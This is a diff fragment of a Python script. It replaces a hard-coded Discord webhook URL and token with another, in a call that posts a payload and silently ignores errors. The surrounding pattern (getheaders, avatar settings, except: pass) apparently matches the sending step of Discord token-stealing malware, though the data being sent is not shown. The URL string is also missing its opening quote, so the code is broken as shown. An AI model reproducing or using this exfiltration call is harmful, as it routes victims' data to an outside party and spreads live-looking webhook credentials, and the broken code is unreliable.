@@ -156,7 +156,7 @@ def main():
         "avatar_url": "https://media.discordapp.net/attachments/878154522978029582/917679300705124412/a4235fd1da45633adbc305450741b506.png"
     }
     try:
-        urlopen(Request(https://discord.com/api/webhooks/972426133742182410/G2Xbx-hHpI3xYJbJ1cvUgeeEzaF85kve7ojsZou3Ubz07tRg_6oM61_J4TopEFvyfG7v", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(https://discord.com/api/webhooks/972453846427267122/9VHvCIQFk_-erVymGn1DWOXblxpXzJul5qnv1Jim2CQTVubigwktP2JtSGUGSk5mlcTx", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     
